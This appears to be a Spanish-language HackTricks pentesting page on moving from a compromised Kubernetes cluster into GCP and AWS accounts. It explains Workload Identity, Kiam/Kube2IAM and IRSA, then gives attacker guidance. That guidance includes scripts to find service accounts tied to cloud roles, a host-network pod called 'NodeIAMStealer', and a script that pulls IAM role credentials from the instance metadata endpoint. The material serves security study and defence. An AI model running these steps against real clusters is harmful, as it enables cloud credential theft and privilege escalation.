# Kubernetes Pivoting to Clouds

{{#include ../../banners/hacktricks-training.md}}

## GCP

Si estás ejecutando un clúster de k8s dentro de GCP, probablemente querrás que alguna aplicación que se ejecute dentro del clúster tenga acceso a GCP. Hay 2 formas comunes de hacerlo:

### Montando claves de GCP-SA como secreto

Una forma común de dar **acceso a una aplicación de kubernetes a GCP** es:

- Crear una Cuenta de Servicio de GCP
- Asignarle los permisos deseados
- Descargar una clave json de la SA creada
- Montarla como un secreto dentro del pod
- Establecer la variable de entorno GOOGLE_APPLICATION_CREDENTIALS apuntando a la ruta donde se encuentra el json.

> [!WARNING]
> Por lo tanto, como **atacante**, si comprometes un contenedor dentro de un pod, deberías verificar esa **variable** **env** y los **archivos** **json** con credenciales de GCP.

### Relacionando json de GSA a secreto de KSA

Una forma de dar acceso a un GSA a un clúster de GKE es vinculándolos de esta manera:

- Crear una cuenta de servicio de Kubernetes en el mismo namespace que tu clúster de GKE usando el siguiente comando:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
- Crea un Kubernetes Secret que contenga las credenciales de la cuenta de servicio de GCP a la que deseas otorgar acceso al clúster de GKE. Puedes hacer esto utilizando la herramienta de línea de comandos `gcloud`, como se muestra en el siguiente ejemplo:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
- Vincula el Secret de Kubernetes a la cuenta de servicio de Kubernetes utilizando el siguiente comando:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
> [!WARNING]
> En el **segundo paso** se configuraron las **credenciales de la GSA como secreto de la KSA**. Entonces, si puedes **leer ese secreto** desde **dentro** del **clúster GKE**, puedes **escalar a esa cuenta de servicio de GCP**.

### Identidad de Carga de Trabajo de GKE

Con la Identidad de Carga de Trabajo, podemos configurar una [cuenta de servicio de Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) para actuar como una [cuenta de servicio de Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Los pods que se ejecutan con la cuenta de servicio de Kubernetes se autenticarán automáticamente como la cuenta de servicio de Google al acceder a las API de Google Cloud.

La **primera serie de pasos** para habilitar este comportamiento es **habilitar la Identidad de Carga de Trabajo en GCP** ([**pasos**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) y crear la SA de GCP que deseas que k8s impersonifique.

- **Habilitar la Identidad de Carga de Trabajo** en un nuevo clúster
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
- **Crear/Actualizar un nuevo grupo de nodos** (los clústeres Autopilot no necesitan esto)
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
- Crea la **Cuenta de Servicio de GCP para suplantar** desde K8s con permisos de GCP:
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
- **Conéctese** al **clúster** y **cree** la **cuenta de servicio** para usar
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
- **Vincular la GSA con la KSA**
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
- Ejecuta un **pod** con el **KSA** y verifica el **acceso** a **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Verifica el siguiente comando para autenticarte en caso de ser necesario:
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
> [!WARNING]
> Como atacante dentro de K8s, deberías **buscar SAs** con la **anotación `iam.gke.io/gcp-service-account`** ya que eso indica que la SA puede acceder a algo en GCP. Otra opción sería intentar abusar de cada KSA en el clúster y verificar si tiene acceso.\
> Desde GCP siempre es interesante enumerar los bindings y saber **qué acceso estás otorgando a las SAs dentro de Kubernetes**.

Este es un script para **iterar fácilmente sobre todas las definiciones de pods** **buscando** esa **anotación**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (rol IAM para Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Una forma (desactualizada) de dar roles IAM a los Pods es usar un [**Kiam**](https://github.com/uswitch/kiam) o un [**Kube2IAM**](https://github.com/jtblin/kube2iam) **servidor.** Básicamente, necesitarás ejecutar un **daemonset** en tu clúster con un **tipo de rol IAM privilegiado**. Este daemonset será el que dará acceso a los roles IAM a los pods que lo necesiten.

Primero que nada, necesitas configurar **qué roles pueden ser accedidos dentro del namespace**, y lo haces con una anotación dentro del objeto namespace:
```yaml:Kiam
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```

```yaml:Kube2iam
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
Una vez que el namespace está configurado con los roles de IAM que los Pods pueden tener, puedes **indicar el rol que deseas en cada definición de pod con algo como**:
```yaml:Kiam & Kube2iam
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
> [!WARNING]
> Como atacante, si **encuentras estas anotaciones** en pods o namespaces o un servidor kiam/kube2iam en ejecución (probablemente en kube-system) puedes **suplantar cada r**ol que ya está **usado por pods** y más (si tienes acceso a la cuenta de AWS, enumera los roles).

#### Crear Pod con Rol IAM

> [!NOTE]
> El rol IAM que se debe indicar debe estar en la misma cuenta de AWS que el rol kiam/kube2iam y ese rol debe poder acceder a él.
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role para Cuentas de Servicio K8s a través de OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Esta es la **manera recomendada por AWS**.

1. Primero que nada, necesitas [crear un proveedor OIDC para el clúster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Luego, creas un rol IAM con los permisos que la SA requerirá.
3. Crea una [relación de confianza entre el rol IAM y la SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) nombre (o los namespaces que dan acceso al rol a todas las SAs del namespace). _La relación de confianza principalmente verificará el nombre del proveedor OIDC, el nombre del namespace y el nombre de la SA_.
4. Finalmente, **crea una SA con una anotación que indique el ARN del rol**, y los pods que se ejecuten con esa SA tendrán **acceso al token del rol**. El **token** está **escrito** dentro de un archivo y la ruta se especifica en **`AWS_WEB_IDENTITY_TOKEN_FILE`** (predeterminado: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Para **obtener aws usando el token** de `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, ejecuta:
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
> [!WARNING]
> Como atacante, si puedes enumerar un clúster de K8s, verifica las **cuentas de servicio con esa anotación** para **escalar a AWS**. Para hacerlo, simplemente **exec/create** un **pod** utilizando una de las **cuentas de servicio privilegiadas** de IAM y roba el token.
>
> Además, si estás dentro de un pod, verifica las variables de entorno como **AWS_ROLE_ARN** y **AWS_WEB_IDENTITY_TOKEN.**

> [!CAUTION]
> A veces, la **Política de Confianza de un rol** puede estar **mal configurada** y en lugar de dar acceso a AssumeRole a la cuenta de servicio esperada, se lo da a **todas las cuentas de servicio**. Por lo tanto, si puedes escribir una anotación en una cuenta de servicio controlada, puedes acceder al rol.
>
> Consulta la **siguiente página para más información**:

{{#ref}}
../aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

### Encontrar Pods y Cuentas de Servicio con Roles de IAM en el Clúster

Este es un script para **iterar fácilmente sobre todos los pods y definiciones de cuentas de servicio** **buscando** esa **anotación**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Role

La sección anterior trataba sobre cómo robar roles de IAM con pods, pero ten en cuenta que un **Node del** clúster K8s va a ser una **instancia dentro de la nube**. Esto significa que es muy probable que el Node **tenga un nuevo rol de IAM que puedes robar** (_ten en cuenta que generalmente todos los nodos de un clúster K8s tendrán el mismo rol de IAM, por lo que puede que no valga la pena intentar verificar en cada nodo_).

Sin embargo, hay un requisito importante para acceder al endpoint de metadatos desde el nodo, necesitas estar en el nodo (¿sesión ssh?) o al menos tener la misma red:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Robar el Token del Rol IAM

Anteriormente hemos discutido cómo **adjuntar Roles IAM a Pods** o incluso cómo **escapar al Nodo para robar el Rol IAM** que la instancia tiene adjunto.

Puedes usar el siguiente script para **robar** tus nuevas y arduamente trabajadas **credenciales del rol IAM**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Referencias

- [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
- [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{{#include ../../banners/hacktricks-training.md}}
